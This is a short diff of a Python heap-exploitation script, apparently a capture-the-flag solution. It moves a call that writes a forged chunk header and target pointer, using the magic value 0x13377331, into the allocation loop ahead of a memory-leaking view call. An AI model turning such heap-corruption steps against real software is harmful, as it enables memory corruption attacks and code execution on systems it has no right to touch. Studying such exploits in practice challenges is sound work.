@@ -75,6 +75,7 @@ while True:
         update(8,p64(0)*5+p64(0x501)+p64(0)+p64(addr+8)+p64(0)+p64(addr-0x18-5))
         
         alloc(0x48)     # 2
+        update(2,p64(0)*5+p64(0x13377331)+p64(addr+0x20+0x30))
 
         break
         #alloc(0x4f0)   
@@ -84,7 +85,6 @@ while True:
 
 
 
-update(2,p64(0)*5+p64(0x13377331)+p64(addr+0x20+0x30))
 update(0,p64(addr+3)+p64(8))
 view(1)
 
